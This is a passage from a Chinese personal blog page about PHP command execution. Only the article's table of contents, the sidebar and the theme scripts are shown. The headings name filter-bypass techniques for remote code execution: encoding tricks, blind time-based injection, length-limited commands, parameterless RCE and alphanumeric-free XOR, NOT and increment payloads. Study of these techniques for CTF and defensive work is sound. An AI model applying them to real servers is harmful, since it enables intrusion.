class="toc-text">8.sort：主要用于排序文件；</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-uniq%EF%BC%9A%E6%8A%A5%E5%91%8A%E6%88%96%E5%88%A0%E9%99%A4%E6%96%87%E4%BB%B6%E4%B8%AD%E9%87%8D%E5%A4%8D%E7%9A%84%E8%A1%8C%EF%BC%9B"><span class="toc-number">8.16.</span> <span class="toc-text">9.uniq：报告或删除文件中重复的行；</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-file-f-%E6%8A%A5%E9%94%99%E5%87%BA%E5%85%B7%E4%BD%93%E5%86%85%E5%AE%B9"><span class="toc-number">8.17.</span> <span class="toc-text">10.file -f; 报错出具体内容</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x10-%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">9.</span> <span class="toc-text">0x10.编码绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-base64%E7%BC%96%E7%A0%81"><span class="toc-number">9.1.</span> <span class="toc-text">1.base64编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-base32%E7%BC%96%E7%A0%81"><span class="toc-number">9.2.</span> <span class="toc-text">2.base32编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-HEX%E7%BC%96%E7%A0%81"><span class="toc-number">9.3.</span> <span class="toc-text">3.HEX编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-shellcode%E7%BC%96%E7%A0%81"><span class="toc-number">9.4.</span> <span class="toc-text">4.shellcode编码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x11%E6%97%A0%E5%9B%9E%E6%98%BE%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">10.</span> <span class="toc-text">0x11无回显时间盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E7%9B%B2%E6%B3%A8"><span class="toc-number">10.1.</span> <span class="toc-text">命令盲注</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4"><span class="toc-number">10.2.</span> <span class="toc-text">相关命令</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-sleep"><span class="toc-number">10.2.1.</span> <span class="toc-text">1.sleep</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-awk-NR"><span class="toc-number">10.2.2.</span> <span class="toc-text">2.awk NR</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-cut-c"><span class="toc-number">10.2.3.</span> <span class="toc-text">3.cut -c</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-if%E8%AF%AD%E5%8F%A5"><span class="toc-number">10.2.4.</span> <span class="toc-text">4.if语句</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x12%E9%95%BF%E5%BA%A6%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">11.</span> <span class="toc-text">0x12长度过滤绕过前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%A6%E5%8F%B7%E5%92%8C-%E7%AC%A6%E5%8F%B7"><span class="toc-number">11.1.</span> <span class="toc-text">&gt;符号和 &gt;&gt;符号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%8D%A2%E8%A1%8C"><span class="toc-number">11.2.</span> <span class="toc-text">命令换行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ls-t%E5%91%BD%E4%BB%A4"><span class="toc-number">11.3.</span> <span class="toc-text">ls -t命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sh"><span class="toc-number">11.4.</span> <span class="toc-text">sh</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%84%E5%90%88%E8%BF%90%E7%94%A8"><span class="toc-number">11.5.</span> <span class="toc-text">组合运用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dir%E5%8F%8A-%E5%92%8Crev"><span class="toc-number">11.6.</span> <span class="toc-text">dir及 *和rev</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x13%E9%95%BF%E5%BA%A6%E4%B8%BA7%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="toc-number">12.</span> <span class="toc-text">0x13长度为7绕过方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x14%E9%95%BF%E5%BA%A6%E4%B8%BA5"><span class="toc-number">13.</span> <span class="toc-text">0x14长度为5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x15%E9%95%BF%E5%BA%A6%E4%B8%BA4"><span class="toc-number">14.</span> <span class="toc-text">0x15长度为4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x16%E6%97%A0%E5%8F%82%E6%95%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">15.</span> <span class="toc-text">0x16无参数命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP%E8%AF%B7%E6%B1%82%E5%A4%B4%E7%BB%95%E8%BF%87-php7-3"><span class="toc-number">15.1.</span> <span class="toc-text">HTTP请求头绕过(php7.3)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x17%E6%97%A0%E5%8F%82%E6%95%B0%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8FRCE-php5-7"><span class="toc-number">16.</span> <span class="toc-text">0x17无参数全局变量RCE(php5&#x2F;7)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x18%E6%97%A0%E5%8F%82%E6%95%B0session-RCE"><span class="toc-number">17.</span> <span class="toc-text">0x18无参数session RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8session-php5"><span class="toc-number">17.1.</span> <span class="toc-text">利用session(php5)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AAA%E5%81%B7%E6%B8%A1%E9%98%B4%E5%B9%B3%EF%BC%88%E5%A4%8D%E4%BB%87%EF%BC%89%E4%B8%8E%E6%9C%AC%E9%9D%B6%E5%9C%BA%E7%9A%84%E6%AF%94%E8%BE%83"><span class="toc-number">17.2.</span> <span class="toc-text">AAA偷渡阴平（复仇）与本靶场的比较</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x19%E6%97%A0%E5%8F%82%E6%95%B0scandir%E8%AF%BB%E5%8F%96"><span class="toc-number">18.</span> <span class="toc-text">0x19无参数scandir读取</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%93%E5%89%8D%E7%9B%AE%E5%BD%95"><span class="toc-number">18.1.</span> <span class="toc-text">当前目录</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#scandir"><span class="toc-number">18.1.1.</span> <span class="toc-text">scandir()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#getcwd"><span class="toc-number">18.1.2.</span> <span class="toc-text">getcwd</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8A%E7%BA%A7%E7%9B%AE%E5%BD%95"><span class="toc-number">18.2.</span> <span class="toc-text">上级目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%B9%E7%9B%AE%E5%BD%95"><span class="toc-number">18.3.</span> <span class="toc-text">根目录</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x20%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E5%BC%82%E6%88%96%E8%BF%90%E7%AE%97%E7%BB%95%E8%BF%87"><span class="toc-number">19.</span> <span class="toc-text">0x20无字母数字异或运算绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP5"><span class="toc-number">19.1.</span> <span class="toc-text">PHP5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP7"><span class="toc-number">19.2.</span> <span class="toc-text">PHP7</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x21%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E5%8F%96%E5%8F%8D%E7%BB%95%E8%BF%87"><span class="toc-number">20.</span> <span class="toc-text">0x21无字母数字取反绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP5-1"><span class="toc-number">20.1.</span> <span class="toc-text">PHP5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP7-1"><span class="toc-number">20.2.</span> <span class="toc-text">PHP7</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x22%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E8%87%AA%E5%A2%9E%E7%BB%95%E8%BF%87"><span class="toc-number">21.</span> <span class="toc-text">0x22无字母数字自增绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP5-2"><span class="toc-number">21.1.</span> <span class="toc-text">PHP5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP7-2"><span class="toc-number">21.2.</span> <span class="toc-text">PHP7</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x23%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E7%89%B9%E6%AE%8A%E7%AC%A6%E5%8F%B7%E8%BF%87%E6%BB%A4-php7"><span class="toc-number">22.</span> <span class="toc-text">0x23无字母数字特殊符号过滤(php7)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E4%B8%8B%E5%88%92%E7%BA%BF"><span class="toc-number">22.1.</span> <span class="toc-text">无字母数字下划线</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E4%B8%8B%E5%88%92%E7%BA%BF%E5%8F%8A-%E7%AC%A6%E5%8F%B7%E8%BF%87%E6%BB%A4"><span class="toc-number">22.2.</span> <span class="toc-text">无字母数字下划线及$符号过滤</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP7-3"><span class="toc-number">22.2.1.</span> <span class="toc-text">PHP7</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PHP5-3"><span class="toc-number">22.2.2.</span> <span class="toc-text">PHP5</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E8%BF%87%E6%BB%A4"><span class="toc-number">22.3.</span> <span class="toc-text">无字母数字过滤;~^&#96;&amp;|</span></a></li></ol></li></ol>
      
  </div>
</div>
</div>
        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="达达" class="lazyload">
  <div class="sidebar-author-name">达达</div>
  <div class="sidebar-description"></div>
</div>
<div class="sidebar-state">
  <div class="sidebar-state-article">
    <div>文章</div>
    <div class="sidebar-state-number">14</div>
  </div>
  <div class="sidebar-state-category">
    <div>分类</div>
    <div class="sidebar-state-number">0</div>
  </div>
  <div class="sidebar-state-tag">
    <div>标签</div>
    <div class="sidebar-state-number">0</div>
  </div>
</div>
<div class="sidebar-social">
  
</div>
<div class="sidebar-menu">
  
    
      <div class="sidebar-menu-link-wrap">
        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
        <div class="sidebar-menu-icon icon rotate">
          
            &#xe62b;
          
        </div>
        <div class="sidebar-menu-link">首页</div>
      </div>
    
      <div class="sidebar-menu-link-wrap">
        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
        <div class="sidebar-menu-icon icon rotate">
          
            &#xe62b;
          
        </div>
        <div class="sidebar-menu-link">归档</div>
      </div>
    
      <div class="sidebar-menu-link-wrap">
        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
        <div class="sidebar-menu-icon icon rotate">
          
            &#xe62b;
          
        </div>
        <div class="sidebar-menu-link">关于</div>
      </div>
    
      <div class="sidebar-menu-link-wrap">
        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
        <div class="sidebar-menu-icon icon rotate">
          
            &#xe62b;
          
        </div>
        <div class="sidebar-menu-link">友链</div>
      </div>
    
  
</div>
</div>
      
    
  </div>
  
    
      <div class="sidebar-btn-wrapper">
        <div class="sidebar-toc-btn current"></div>
        <div class="sidebar-common-btn"></div>
      </div>
    
  
</nav>

    </div>
    
    
    
    
<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>


<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>





<script src="/js/script.js"></script>



  
<script src="/js/aos.js"></script>

  <script>
    var aosInit = () => {
      AOS.init({
        duration: 1000,
        easing: "ease",
        once: true,
        offset: 50,
      });
    };
    if (document.readyState === 'loading') {
      document.addEventListener('DOMContentLoaded', aosInit);
    } else {
      aosInit();
    }
  </script>



<script src="/js/pjax_script.js" data-pjax></script>







  
<script src="https://npm.webcache.cn/mouse-firework@0.1.1/dist/index.umd.js" integrity="sha384-8LyaidD9GPxQQgLJO&#x2F;WRw&#x2F;O2h3BoNq&#x2F;ApI&#x2F;ecpvM6RsrCz2qP2ppBXUKihP4V&#x2F;2d" crossorigin="anonymous"></script>

  <script>
    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
  </script>










<div id="lazy-script">
  <div>
    
      
      
      <script data-pjax>
        window.REIMU_POST = {
          author: "达达",
          title: "php命令执行",
          url: "http://dada-06.github.io/2025/04/30/php%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/",
          excerpt: "",
          description: "",
          stripContent: "0x01命令执行函数介绍常见函数 system   exec   passthru   shell_exec   反引号   popen   proc_open   pcntl_exec system  有回显system(string $command,int &amp;amp;$return_var &amp;#x3D; ?) 常用参数： command：执行command参数所指定的目录，并且输出执行结果 如果提供rerurn_var参数，则外部命令执行后的返回状态将会被设置到此变量中 exec  回显最",
          date: "Wed Apr 30 2025 12:03:11 GMT+0800",
          updated: "Mon May 05 2025 18:58:51 GMT+0800",
          cover: "/../covers/12.jpg",
        };
      </script>
       
    
    
      
        
<script src="/js/insert_highlight.js" data-pjax></script>

        
      
    
    
      <script type="module" data-pjax>
        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
        
        const pswp = () => {
          if (_$$('.article-entry a.article-gallery-item').length > 0) {
            new PhotoSwipeLightbox({
              gallery: '.article-entry',
              children: 'a.article-gallery-item',
              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
            }).init();
          }
          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
            new PhotoSwipeLightbox({
              gallery: '.article-gallery',
              children: 'a.article-gallery-item',
              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
            }).init();
          }
          window.lightboxStatus = 'done';
          window.removeEventListener('lightbox:ready', pswp);
        }
        if(window.lightboxStatus === 'ready') {
          pswp()
        } else {
          window.addEventListener('lightbox:ready', pswp);
        }
      </script>
      
        








      
    
  </div>
</div>


  <script>
    console.log(String.raw`%c 
 ______     ______     __     __    __     __  __    
/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
 \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
                                                  
`,'color: #ff5252;')
    console.log('%c Theme.Reimu v' + '1.8.4' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
  </script>
  



  
<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>




<script>
  if ('serviceWorker' in navigator) {
    navigator.serviceWorker.getRegistrations().then((registrations) => {
      for (let registration of registrations) {
        registration.unregister();
      }
    });
  }
</script>









    
  </body>
  </html>

